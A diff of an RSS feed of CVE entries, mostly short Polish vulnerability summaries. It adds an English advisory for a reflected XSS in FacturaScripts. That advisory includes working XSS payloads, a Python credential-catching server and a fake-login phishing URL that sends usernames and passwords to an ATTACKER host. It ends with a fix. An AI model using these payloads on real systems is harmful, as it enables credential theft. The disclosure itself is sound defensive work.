@@ -1,5 +1,181 @@
 <?xml version='1.0' encoding='utf-8'?>
-<rss version="2.0"><channel><title>CVE 2026 Feed</title><link>https://cve.circl.lu</link><description>CVE z roku 2026</description><item><title>CVE-2025-69207</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69207</link><pubDate>Mon, 02 Feb 2026 17:31:33 +0000</pubDate><description>### Podsumowanie
+<rss version="2.0"><channel><title>CVE 2026 Feed</title><link>https://cve.circl.lu</link><description>CVE z roku 2026</description><item><title>CVE-2026-23476</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-23476</link><pubDate>Mon, 02 Feb 2026 18:00:43 +0000</pubDate><description># Reflected XSS via SQL Error Messages
+
+## Summary
+
+A reflected XSS bug has been found in FacturaScripts. The problem is in how error messages get displayed - it's using Twig's `| raw` filter which skips HTML escaping. When a database error is triggered (like passing a string where an integer is expected), the error message includes all input and gets rendered without sanitization.
+
+Attackers can use this to phish credentials from other users since HttpOnly is set on cookies (so stealing cookies directly won't work, but attackers can inject a fake login form).
+
+**CVSS 6.1 (Medium-High)**
+
+---
+
+## What was Found
+
+### Where the bug exists in the code:
+
+`Core/View/Macro/Utils.html.twig`, line 27:
+
+```twig
+{% for item in messages %}
+    &lt;div&gt;{{ item.message | raw }}&lt;/div&gt;
+{% endfor %}
+```
+
+That `| raw` is the problem. It tells Twig not to escape anything.
+
+### How it works
+
+So here's what happens:
+
+1. Hhit `/EditProducto?code=&lt;svg onload=alert(1)&gt; or &lt;img src=x onerror=alert(1)&gt;`
+2. The app tries to look up a product with that "code"
+3. PostgreSQL throws an error because `&lt;svg onload=alert(1)&gt;` isn't a valid integer
+4. The error goes something like:   ```
+   ERROR: invalid input syntax for type integer: "&lt;svg onload=alert(1)&gt;"
+   LINE 1: SELECT * FROM "productos" WHERE "idproducto" = '&lt;img src=x onerror=alert(1)&gt;"
+   ```
+5. This gets logged via MiniLog and displayed to the user
+6. Because of `| raw`, the browser actually executes the JS
+
+The error logging happens in `Core/Base/DataBase.php` around line 236:
+
+```php
+self::$miniLog-&gt;error(self::$engine-&gt;errorMessage(self::$link), ['sql' =&gt; $sql]);
+```
+
+And PostgreSQL's error message includes whatever garbage it was sent.
+
+---
+
+## Reproduction Steps
+
+### Requirements
+- Working FacturaScripts install
+- Any user account (doesn't need to be admin)
+- The victim needs to be logged in
+
+### Quick test
+
+Just visit this URL while logged in:
+```
+http://localhost/EditProducto?code=&lt;svg onload=alert(document.domain)&gt;
+```
+
+An alert box should  pop up.
+
+### For a real attack (credential phishing)
+
+Set up a simple server to catch credentials:
+
+```python
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from urllib.parse import urlparse, parse_qs
+
+class Handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        q = parse_qs(urlparse(self.path).query)
+        print(f"\nGot creds:")
+        print(f"  User: {q.get('user', ['?'])[0]}")
+        print(f"  Pass: {q.get('pass', ['?'])[0]}")
+        self.send_response(200)
+        self.end_headers()
+    def log_message(self, *args): pass
+
+HTTPServer(('', 8888), Handler).serve_forever()
+```
+
+Then craft a URL that injects a fake login form:
+
+```
+http://TARGET/EditProducto?code=&lt;svg onload="document.body.innerHTML='&lt;div style=text-align:center;padding:100px&gt;&lt;h2&gt;Session Expired&lt;/h2&gt;&lt;form action=http://ATTACKER:8888/steal&gt;&lt;input name=user placeholder=Username&gt;&lt;br&gt;&lt;input name=pass type=password placeholder=Password&gt;&lt;br&gt;&lt;button&gt;Login&lt;/button&gt;&lt;/form&gt;&lt;/div&gt;'"&gt;
+```
+
+Send that to someone (email, chat, whatever). When they click it and enter their password thinking their session expired, their creds are displayed.
+
+### Other endpoints that work
+
+Pretty much anything that uses the `code` parameter:
+- `/EditProducto?code=`
+- `/EditCliente?code=`
+- `/EditFacturaCliente?code=`
+- `/EditProveedor?code=`
+- etc.
+
+Basically all the Edit controllers.
+
+---
+
+## Impact
+
+### What attackers can do with this
+
+**Steal credentials** - Can't grab cookies directly (HttpOnly), but the phishing form trick works great. Victim thinks their session timed out and re-enters their password.
+
+**Read page data** - Once JS is running, attackers can scrape whatever's on the page (invoices, customer info, financial data) and send it somewhere.
+
+**Keylog** - Inject a keylogger that captures everything they type.
+
+**Bypass CSRF** - Grab the `multireqtoken` from the page and make requests as the victim.
+
+### What attackers CAN'T do
+
+Can't steal session cookies via `document.cookie` - they're HttpOnly.
+
+### Business side
+
+This is a financial app, so if attackers compromise an admin account, the following is possible to create or expose:
+- Fake invoices
+- Redirected payments  
+- Customer data breach (GDPR stuff)
+- The usual mess
+
+---
+
+## Fix
+
+### Quick fix
+
+Just remove `| raw` from line 27 in `Core/View/Macro/Utils.html.twig`:
+
+```diff
+-    &lt;div&gt;{{ item.message | raw }}&lt;/div&gt;
++    &lt;div&gt;{{ item.message }}&lt;/div&gt;
+```
+
+That's it. Twig escapes by default, so removing `| raw` fixes the XSS.
+
+### If projects want to be thorough
+
+1. Sanitize messages before they go into the log:
+```php
+$message = htmlspecialchars($message, ENT_QUOTES, 'UTF-8');
+```
+
+2. Add CSP headers to block inline scripts as a backup
+
+3. Maybe validate the `code` parameter format before it hits the database
+
+---
+
+## Resources
+
+- https://cwe.mitre.org/data/definitions/79.html
+- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
+
+---
+
+**Found:** Dec 31, 2025  
+**Tested on:** FacturaScripts 2025.61 (Docker), verified vulnerable in 2025.71 (GitHub latest)
+&lt;img width="1917" height="868" alt="1" src="https://github.com/user-attachments/assets/a7d770c8-1d61-499c-83dc-e21be8e61c87" /&gt;
+&lt;img width="337" height="130" alt="3" src="https://github.com/user-attachments/assets/463067ee-3a73-45ed-af26-c32264d5bf41" /&gt;
+&lt;img width="1915" height="870" alt="phising" src="https://github.com/user-attachments/assets/6e15a021-dc5f-4708-bdd1-887ecb2d2ffb" /&gt;
+&lt;img width="1915" height="862" alt="phising2" src="https://github.com/user-attachments/assets/100a63b6-c066-43d5-ab39-6085f51ba282" /&gt;
+&lt;img width="1918" height="877" alt="sql erroe" src="https://github.com/user-attachments/assets/4c3182ba-380d-44d4-ab34-4b0840ad3e39" /&gt;
+&lt;img width="1165" height="277" alt="version" src="https://github.com/user-attachments/assets/5f23e4de-cf03-4fcf-a6c5-6ca327c8c43a" /&gt;</description></item><item><title>CVE-2026-22229</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22229</link><pubDate>Mon, 02 Feb 2026 17:58:32 +0000</pubDate><description>Luka w zabezpieczeniach umożliwiająca wstrzykiwanie poleceń może zostać wykorzystana po uwierzytelnieniu administratora poprzez import spreparowanego pliku konfiguracyjnego klienta VPN na urządzeniu TP-Link Archer BE230 v1.2.Skuteczne wykorzystanie może umożliwić osobie atakującej uzyskanie pełnej kontroli administracyjnej nad urządzeniem, co może skutkować poważnym naruszeniem integralności konfiguracji, bezpieczeństwa sieci i dostępności usług.
+To CVE obejmuje jeden z wielu różnych problemów z wstrzykiwaniem poleceń systemu operacyjnego zidentyfikowanych w oddzielnych ścieżkach kodu.Chociaż charakter jest podobny, każde wystąpienie jest śledzone pod unikalnym identyfikatorem CVE.
+Ten problem dotyczy Archera BE230 v1.2 &lt; 1.2.4 Build 20251218 rel.70420.</description></item><item><title>CVE-2025-69207</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69207</link><pubDate>Mon, 02 Feb 2026 17:31:33 +0000</pubDate><description>### Podsumowanie
 IDOR w wywołaniu zwrotnym Notion OAuth umożliwia atakującemu przejęcie integracji Notion dowolnego użytkownika poprzez manipulację parametrem stanu.Punkt końcowy wywołania zwrotnego akceptuje dowolny identyfikator UUID użytkownika bez sprawdzania, czy przepływ OAuth został zainicjowany przez tego użytkownika, co umożliwia atakującym zastąpienie konfiguracji Notion ofiary własnymi, co skutkuje zatruciem danych i nieautoryzowanym dostępem do indeksu wyszukiwania Khoj ofiary.
 
 Atak ten wymaga znajomości identyfikatora UUID użytkownika, który może zostać ujawniony podczas wspólnych rozmów, w których obecny jest obraz wygenerowany przez sztuczną inteligencję.
@@ -1343,7 +1519,7 @@ CVSS Score: 4.9 (medium)</description></item><item><title>CVE-2026-24739</title>
 
 CVSS Score: 6.3 (medium)</description></item><item><title>CVE-2026-24742</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-24742</link><pubDate>Wed, 28 Jan 2026 20:11:30 +0000</pubDate><description>Discourse jest platformą dyskusyjną o otwartym kodzie źródłowym.W wersjach wcześniejszych niż 3.5.4, 2025.11.2, 2025.12.1 i 2026.1.0 moderatorzy niebędący administratorami mogą przeglądać poufne informacje w dziennikach działań personelu, które powinny być dostępne wyłącznie dla administratorów.Ujawnione informacje obejmują adresy URL i sekrety elementów webhook, szczegóły klucza API, zmiany ustawień witryny, treść prywatnych wiadomości, nazwy i struktury kategorii objętych ograniczeniami oraz tytuły prywatnych kanałów czatu.Pozwala to moderatorom ominąć zamierzoną kontrolę dostępu i wyodrębnić poufne dane poprzez monitorowanie dzienników działań personelu.W przypadku ujawnienia sekretów webhooka osoba atakująca może potencjalnie sfałszować zdarzenia webhooka do zintegrowanych usług.Ten problem został rozwiązany w wersjach 3.5.4, 2025.11.2, 2025.12.1 i 2026.1.0.W ramach obejścia administratorzy witryny powinni sprawdzić i ograniczyć nominacje moderatorów do w pełni zaufanych użytkowników.Nie ma żadnego rozwiązania opartego na konfiguracji, które mogłoby zapobiec temu dostępowi.
 
-CVSS Score: 6.5 (medium)</description></item><item><title>CVE-2026-23743</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-23743</link><pubDate>Wed, 28 Jan 2026 20:07:21 +0000</pubDate><description>Discourse jest platformą dyskusyjną o otwartym kodzie źródłowym.W wersjach wcześniejszych niż 3.5.4, 2025.11.2, 2025.12.1 i 2026.1.0 łącza bezpośrednie wskazujące zasoby o ograniczonym dostępie (prywatne tematy, kategorie, posty lub ukryte tagi) przekierowywały użytkowników do adresów URL zawierających informację o zasobach, nawet jeśli użytkownik nie miał dostępu do przeglądania zasobu.Spowodowało to wyciek potencjalnie poufnych informacji (np. tytułów tematów prywatnych) poprzez nagłówek lokalizacji przekierowania i pole wyszukiwania strony 404.Ten problem został rozwiązany w wersjach 3.5.4, 2025.11.2, 2025.12.1 i 2026.1.0.Nie są dostępne żadne znane obejścia.</description></item><item><title>CVE-2025-14840</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-14840</link><pubDate>Wed, 28 Jan 2026 20:03:21 +0000</pubDate><description>Luka w zabezpieczeniach Nieprawidłowe sprawdzanie nietypowych lub wyjątkowych warunków w Drupal HTTP Client Manager umożliwia wymuszone przeglądanie. Ten problem dotyczy Menedżera klienta HTTP: od 0.0.0 przed 9.3.13, od 10.0.0 przed 10.0.2, od 11.0.0 przed 11.0.1.</description></item><item><title>CVE-2026-21865</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21865</link><pubDate>Wed, 28 Jan 2026 19:51:37 +0000</pubDate><description>Discourse jest platformą dyskusyjną o otwartym kodzie źródłowym.W wersjach wcześniejszych niż 3.5.4, 2025.11.2, 2025.12.1 i 2026.1.0 moderatorzy mogą konwertować niektóre wiadomości osobiste na tematy publiczne, do których nie powinni mieć dostępu.Ten problem został rozwiązany w wersjach 3.5.4, 2025.11.2, 2025.12.1 i 2026.1.0.W ramach obejścia administrator witryny może tymczasowo odebrać rolę moderatora niezaufanym moderatorom lub usunąć grupę moderatorów z ustawienia witryny „Grupy obsługujące wiadomości osobiste” do czasu uaktualnienia instancji Discourse do wersji, która została poprawiona.
+CVSS Score: 6.5 (medium)</description></item><item><title>CVE-2026-23743</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-23743</link><pubDate>Wed, 28 Jan 2026 20:07:21 +0000</pubDate><description>Discourse jest platformą dyskusyjną o otwartym kodzie źródłowym.W wersjach wcześniejszych niż 3.5.4, 2025.11.2, 2025.12.1 i 2026.1.0 łącza bezpośrednie wskazujące zasoby o ograniczonym dostępie (prywatne tematy, kategorie, posty lub ukryte tagi) przekierowywały użytkowników do adresów URL zawierających informację o zasobach, nawet jeśli użytkownik nie miał dostępu do przeglądania zasobu.Spowodowało to wyciek potencjalnie poufnych informacji (np. tytułów tematów prywatnych) poprzez nagłówek lokalizacji przekierowania i pole wyszukiwania strony 404.Ten problem został rozwiązany w wersjach 3.5.4, 2025.11.2, 2025.12.1 i 2026.1.0.Nie są dostępne żadne znane obejścia.</description></item><item><title>CVE-2025-14840</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-14840</link><pubDate>Wed, 28 Jan 2026 20:03:21 +0000</pubDate><description>Luka w zabezpieczeniach Nieprawidłowe sprawdzanie nietypowych lub wyjątkowych warunków w Drupal HTTP Client Manager umożliwia wymuszone przeglądanie. Ten problem dotyczy Menedżera klienta HTTP: od 0.0.0 przed 9.3.13, od 10.0.0 przed 10.0.2, od 11.0.0 przed 11.0.1.</description></item><item><title>CVE-2025-13986</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-13986</link><pubDate>Wed, 28 Jan 2026 20:02:53 +0000</pubDate><description>Obejście uwierzytelniania przy użyciu alternatywnej ścieżki lub kanału Luka w zabezpieczeniach Drupala Wyłącz stronę logowania umożliwia obejście funkcjonalności. Ten problem dotyczy Wyłącz stronę logowania: od wersji 0.0.0 przed 1.1.3.</description></item><item><title>CVE-2026-21865</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21865</link><pubDate>Wed, 28 Jan 2026 19:51:37 +0000</pubDate><description>Discourse jest platformą dyskusyjną o otwartym kodzie źródłowym.W wersjach wcześniejszych niż 3.5.4, 2025.11.2, 2025.12.1 i 2026.1.0 moderatorzy mogą konwertować niektóre wiadomości osobiste na tematy publiczne, do których nie powinni mieć dostępu.Ten problem został rozwiązany w wersjach 3.5.4, 2025.11.2, 2025.12.1 i 2026.1.0.W ramach obejścia administrator witryny może tymczasowo odebrać rolę moderatora niezaufanym moderatorom lub usunąć grupę moderatorów z ustawienia witryny „Grupy obsługujące wiadomości osobiste” do czasu uaktualnienia instancji Discourse do wersji, która została poprawiona.
 
 CVSS Score: 6.5 (medium)</description></item><item><title>CVE-2025-69289</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69289</link><pubDate>Wed, 28 Jan 2026 19:33:58 +0000</pubDate><description>Discourse jest platformą dyskusyjną o otwartym kodzie źródłowym.Luka w zabezpieczeniach umożliwiająca eskalację uprawnień w wersjach wcześniejszych niż 3.5.4, 2025.11.2, 2025.12.1 i 2026.1.0 umożliwia moderatorowi niebędącemu administratorem ominięcie ograniczeń dotyczących zmiany adresu e-mail, umożliwiając przejęcie kont niebędących pracownikami.Ten problem został rozwiązany w wersjach 3.5.4, 2025.11.2, 2025.12.1 i 2026.1.0.Aby obejść ten problem, upewnij się, że moderatorzy są zaufani lub włącz ustawienie „require_change_email_confirmation”.</description></item><item><title>CVE-2025-61728</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-61728</link><pubDate>Wed, 28 Jan 2026 19:30:31 +0000</pubDate><description>Archive/zip wykorzystuje superliniowy algorytm indeksowania nazw plików, który jest wywoływany przy pierwszym otwarciu pliku w archiwum.Może to prowadzić do odmowy usługi podczas korzystania ze złośliwie skonstruowanego archiwum ZIP.</description></item><item><title>CVE-2025-61726</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-61726</link><pubDate>Wed, 28 Jan 2026 19:30:31 +0000</pubDate><description>Pakiet net/url nie ustala limitu liczby parametrów zapytania.Chociaż maksymalny rozmiar parametrów zapytania w adresach URL jest ogólnie ograniczony przez maksymalny rozmiar nagłówka żądania, metoda net/http.Request.ParseForm może analizować duże formularze zakodowane w adresie URL.Analizowanie dużego formularza zawierającego wiele unikalnych parametrów zapytania może spowodować nadmierne zużycie pamięci.</description></item><item><title>CVE-2025-61730</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-61730</link><pubDate>Wed, 28 Jan 2026 19:30:30 +0000</pubDate><description>Jeśli podczas uzgadniania TLS 1.3 zostanie wysłanych wiele wiadomości w rekordach obejmujących granice poziomu szyfrowania (na przykład wiadomości Client Hello i Encrypted Extensions), kolejne wiadomości mogą zostać przetworzone przed zmianą poziomu szyfrowania.Może to spowodować ujawnienie drobnych informacji, jeśli atakujący lokalnie w sieci może wprowadzić wiadomości podczas uzgadniania.</description></item><item><title>CVE-2025-61731</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-61731</link><pubDate>Wed, 28 Jan 2026 19:30:30 +0000</pubDate><description>Tworzenie złośliwego pliku za pomocą polecenia cmd/go może spowodować zapis do pliku kontrolowanego przez osobę atakującą z częściową kontrolą nad zawartością pliku.Dyrektywa „#cgo pkg-config:” w pliku źródłowym Go udostępnia argumenty wiersza poleceń, które można przekazać poleceniu Go pkg-config.Osoba atakująca może podać argument „--log-file” do tej dyrektywy, powodując, że pkg-config zapisuje do lokalizacji kontrolowanej przez osobę atakującą.</description></item><item><title>CVE-2025-68119</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-68119</link><pubDate>Wed, 28 Jan 2026 19:30:30 +0000</pubDate><description>Pobieranie i budowanie modułów zawierających ciągi złośliwej wersji może spowodować wykonanie lokalnego kodu.W systemach z zainstalowanym Mercurialem (hg) pobieranie modułów z niestandardowych źródeł (np. niestandardowych domen) może spowodować nieoczekiwane wykonanie kodu ze względu na konstrukcję zewnętrznych poleceń VCS.Ten problem można również wywołać, dostarczając ciąg złośliwej wersji do łańcucha narzędzi.W systemach z zainstalowanym Gitem pobieranie i budowanie modułów zawierających ciągi złośliwej wersji może pozwolić atakującemu na zapisanie dowolnych plików w systemie plików.Można to wywołać jedynie poprzez jawne dostarczenie ciągów złośliwej wersji do łańcucha narzędzi i nie ma to wpływu na użycie ścieżek @latest lub nagich modułów.</description></item><item><title>CVE-2025-69218</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69218</link><pubDate>Wed, 28 Jan 2026 19:30:28 +0000</pubDate><description>Discourse jest platformą dyskusyjną o otwartym kodzie źródłowym.W wersjach wcześniejszych niż 3.5.4, 2025.11.2, 2025.12.1 i 2026.1.0 moderatorzy mają dostęp do raportu administracyjnego „top_uploads”, który powinien być ograniczony tylko do administratorów.Ten raport wyświetla bezpośrednie adresy URL wszystkich plików przesłanych do witryny, w tym treści poufne, takie jak eksporty danych użytkowników, kopie zapasowe administratora i inne prywatne załączniki, do których moderatorzy nie powinni mieć dostępu.Ten problem został rozwiązany w wersjach 3.5.4, 2025.11.2, 2025.12.1 i 2026.1.0.Nie ma żadnego rozwiązania.Ogranicz uprawnienia moderatora do zaufanych użytkowników do czasu zastosowania łatki.</description></item><item><title>CVE-2025-68934</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-68934</link><pubDate>Wed, 28 Jan 2026 19:19:59 +0000</pubDate><description>Discourse jest platformą dyskusyjną o otwartym kodzie źródłowym.W wersjach wcześniejszych niż 3.5.4, 2025.11.2, 2025.12.1 i 2026.1.0 uwierzytelnieni użytkownicy mogą przesyłać spreparowane ładunki do /drafts.json, które powodują przetwarzanie O(n^2) w Base62.decode, blokując procesy robocze na 35–60 sekund na każde żądanie.Dotyczy to wszystkich użytkowników w miarę wyczerpywania się udostępnionej puli pracowników.Ten problem został rozwiązany w wersjach 3.5.4, 2025.11.2, 2025.12.1 i 2026.1.0.Obniżenie ustawienia witryny max_draft_length zmniejsza powierzchnię ataku, ale nie eliminuje w pełni problemu, ponieważ ładunki poniżej limitu mogą nadal wyzwalać powolną ścieżkę kodu.
 
@@ -4667,7 +4843,7 @@ CVSS Score: 6.4 (medium)</description></item><item><title>CVE-2025-15347</title>
 
 CVSS Score: 8.8 (high)</description></item><item><title>CVE-2025-15043</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-15043</link><pubDate>Tue, 20 Jan 2026 14:26:32 +0000</pubDate><description>Wtyczka Kalendarz wydarzeń dla WordPressa jest podatna na nieautoryzowany dostęp z powodu braku kontroli możliwości funkcji „start_migration”, „cancel_migration” i „revert_migration” we wszystkich wersjach do 6.15.13 włącznie.Dzięki temu uwierzytelnieni atakujący z dostępem na poziomie subskrybenta i wyższym mogą rozpocząć, anulować lub cofnąć migrację bazy danych Custom Tables V1, w tym całkowite usunięcie niestandardowych tabel bazy danych poprzez akcję przywracania.
 
-CVSS Score: 5.4 (medium)</description></item><item><title>CVE-2025-9281</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-9281</link><pubDate>Tue, 20 Jan 2026 13:58:24 +0000</pubDate><description>W ArmorStart® LT występuje problem bezpieczeństwa, który może skutkować odmową usługi.Podczas wykonywania kompleksowych testów burzy ograniczających krok Achillesa urządzenie uruchamia się ponownie</description></item><item><title>CVE-2026-22844</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22844</link><pubDate>Tue, 20 Jan 2026 13:57:44 +0000</pubDate><description>Luka w zabezpieczeniach typu Command Injection w routerach multimedialnych Zoom Node (MMR) wcześniejszych niż wersja 5.2.1716.0 może umożliwiać uczestnikowi spotkania zdalne wykonanie kodu MMR za pośrednictwem dostępu do sieci.
+CVSS Score: 5.4 (medium)</description></item><item><title>CVE-2025-9283</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-9283</link><pubDate>Tue, 20 Jan 2026 13:59:56 +0000</pubDate><description>W ArmorStart® LT występuje problem bezpieczeństwa, który może skutkować odmową usługi.Podczas wykonywania testów burz Achilles EtherNet/IP Step Limits Storms urządzenie nieoczekiwanie uruchamia się ponownie, co powoduje awarię Link State Monitor na kilka sekund.</description></item><item><title>CVE-2025-9282</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-9282</link><pubDate>Tue, 20 Jan 2026 13:59:14 +0000</pubDate><description>W ArmorStart® LT występuje problem bezpieczeństwa, który może skutkować odmową usługi.Podczas wykonywania ograniczonych testów burzowych Achilles Comprehensive urządzenie nieoczekiwanie uruchamia się ponownie, co powoduje wyłączenie monitora stanu łącza na kilka sekund.</description></item><item><title>CVE-2025-9281</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-9281</link><pubDate>Tue, 20 Jan 2026 13:58:24 +0000</pubDate><description>W ArmorStart® LT występuje problem bezpieczeństwa, który może skutkować odmową usługi.Podczas wykonywania kompleksowych testów burzy ograniczających krok Achillesa urządzenie uruchamia się ponownie</description></item><item><title>CVE-2026-22844</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22844</link><pubDate>Tue, 20 Jan 2026 13:57:44 +0000</pubDate><description>Luka w zabezpieczeniach typu Command Injection w routerach multimedialnych Zoom Node (MMR) wcześniejszych niż wersja 5.2.1716.0 może umożliwiać uczestnikowi spotkania zdalne wykonanie kodu MMR za pośrednictwem dostępu do sieci.
 
 CVSS Score: 9.9 (critical)</description></item><item><title>CVE-2025-9280</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-9280</link><pubDate>Tue, 20 Jan 2026 13:57:02 +0000</pubDate><description>W ArmorStart® LT występuje problem bezpieczeństwa, który może skutkować odmową usługi.Fuzzowanie wykonywane przy użyciu Defensics powoduje, że urządzenie przestaje odpowiadać i wymaga ponownego uruchomienia.</description></item><item><title>CVE-2025-14027</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-14027</link><pubDate>Tue, 20 Jan 2026 13:56:43 +0000</pubDate><description>W produkcie, którego dotyczy problem, istnieje wiele luk w zabezpieczeniach umożliwiających odmowę usługi.Problemy te mogą być wywoływane przez różne spreparowane dane wejściowe, w tym zniekształcone komunikaty klasy 3, warunki wycieku pamięci i inne scenariusze wyczerpania zasobów.Eksploatacja może spowodować, że urządzenie przestanie reagować, a w niektórych przypadkach może spowodować poważną, nieodwracalną usterkę.Odzyskiwanie może wymagać ponownego uruchomienia.</description></item><item><title>CVE-2025-9279</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-9279</link><pubDate>Tue, 20 Jan 2026 13:56:22 +0000</pubDate><description>W ArmorStart® LT występuje problem bezpieczeństwa, który może skutkować odmową usługi.Podczas wykonywania testów Achilles EtherNet/IP Step Limit Storm urządzenie nieoczekiwanie uruchamia się ponownie, co powoduje awarię Link State Monitor na kilka sekund.</description></item><item><title>CVE-2025-9278</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-9278</link><pubDate>Tue, 20 Jan 2026 13:55:43 +0000</pubDate><description>W ArmorStart® LT występuje problem bezpieczeństwa, który może skutkować odmową usługi.Po uruchomieniu aktywnego skanowania pakietu Burp Suite urządzenie traci łączność ICMP, przez co aplikacja internetowa staje się niedostępna.</description></item><item><title>CVE-2025-9466</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-9466</link><pubDate>Tue, 20 Jan 2026 13:54:48 +0000</pubDate><description>W ArmorStart® LT występuje problem bezpieczeństwa, który może skutkować odmową usługi.Podczas wykonywania testów gramatycznych Achilles EtherNet/IP i CIP urządzenie nieoczekiwanie uruchamia się ponownie, co powoduje wyłączenie monitora stanu łącza na kilka sekund.</description></item><item><title>CVE-2025-11743</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-11743</link><pubDate>Tue, 20 Jan 2026 13:52:16 +0000</pubDate><description>Problem związany z bezpieczeństwem typu „odmowa usługi” w produkcie, którego dotyczy problem.Problem związany z bezpieczeństwem występuje, gdy wysyłany jest zniekształcony komunikat o otwarciu przesyłania dalej CIP.Może to spowodować poważną, nieodwracalną usterkę. Aby przywrócić działanie, konieczne jest ponowne uruchomienie.</description></item><item><title>CVE-2025-9465</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-9465</link><pubDate>Tue, 20 Jan 2026 13:51:36 +0000</pubDate><description>W ArmorStart® LT występuje problem bezpieczeństwa, który może skutkować odmową usługi.Podczas wykonywania testów gramatycznych Achilles Comprehensive urządzenie nieoczekiwanie uruchamia się ponownie, co powoduje wyłączenie monitora stanu łącza na kilka sekund.</description></item><item><title>CVE-2025-9464</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-9464</link><pubDate>Tue, 20 Jan 2026 13:49:19 +0000</pubDate><description>W ArmorStart® LT występuje problem bezpieczeństwa, który może skutkować odmową usługi.Luka ta jest wyzwalana podczas fuzzowania wielu klas CIP, co powoduje, że port CIP przestaje odpowiadać.</description></item><item><title>CVE-2025-15281</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-15281</link><pubDate>Tue, 20 Jan 2026 13:22:46 +0000</pubDate><description>Wywołanie wordexp z WRDE_REUSE w połączeniu z WRDE_APPEND w bibliotece GNU C od wersji 2.0 do wersji 2.42 może spowodować, że interfejs zwróci niezainicjowaną pamięć w elemencie we_wordv, co przy kolejnych wywołaniach wordfree może przerwać proces.</description></item><item><title>CVE-2025-14377</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-14377</link><pubDate>Tue, 20 Jan 2026 13:21:40 +0000</pubDate><description>W starszym komponencie podręcznika Ansible w programie Verve Asset Manager wykryto problem bezpieczeństwa, spowodowany niepoprawnie przechowywanymi kluczami tajnymi w postaci zwykłego tekstu podczas działania podręcznika.Ten komponent został wycofany i jest opcjonalny od wydania 1.36 w 2024 roku.</description></item><item><title>CVE-2025-14376</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-14376</link><pubDate>Tue, 20 Jan 2026 13:18:32 +0000</pubDate><description>W starszym komponencie serwera ADI programu Verve Asset Manager wykryto problem bezpieczeństwa, spowodowany przez wpisy tajne w postaci zwykłego tekstu przechowywane w zmiennych środowiskowych na serwerze ADI.Ten komponent został wycofany i jest opcjonalny od wydania 1.36 w 2024 roku.</description></item><item><title>CVE-2026-1180</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-1180</link><pubDate>Tue, 20 Jan 2026 12:33:00 +0000</pubDate><description>Wykryto lukę w funkcji dynamicznej rejestracji klienta OpenID Connect w Keycloak, gdy klienci uwierzytelniają się przy użyciu private_key_jwt.Problem umożliwia klientowi określenie dowolnego pliku jwks_uri, który Keycloak następnie pobiera bez sprawdzania miejsca docelowego.Umożliwia to atakującym zmuszenie serwera Keycloak do wysyłania żądań HTTP do wewnętrznych lub ograniczonych zasobów sieciowych.W rezultacie osoby atakujące mogą sondować usługi wewnętrzne i punkty końcowe metadanych w chmurze, stwarzając ryzyko ujawnienia informacji i rozpoznania.
 
